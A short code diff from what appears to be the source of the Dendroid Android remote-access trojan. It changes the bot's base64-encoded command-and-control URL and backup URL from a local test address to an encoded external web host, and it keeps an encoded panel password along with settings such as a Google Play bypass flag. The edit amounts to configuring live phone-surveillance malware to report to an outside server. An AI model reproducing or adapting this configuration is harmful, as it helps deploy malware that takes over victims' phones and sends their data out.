@@ -79,8 +79,8 @@ import android.widget.Toast;
 public class MyService extends Service 
 {
     //********************************************************************************************************************************************************
- 	private String encodedURL = "aHR0cDovLzEwLjAuMC44"; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
- 	private String backupURL = "aHR0cDovLzEwLjAuMC44";
+ 	private String encodedURL = "aHR0cHM6Ly9yYXRjaWJlcnNlZ3VyaWRhZC4wMDB3ZWJob3N0YXBwLmNvbQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
+ 	private String backupURL = "aHR0cHM6Ly9yYXRjaWJlcnNlZ3VyaWRhZC4wMDB3ZWJob3N0YXBwLmNvbQ==";
  	private String encodedPassword = "VmlydHVhbDIwMjA="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
     private int timeout = 100; //Bot timeout
     private Boolean GPlayBypass = false; //true to bypass OR false to initiate immediately
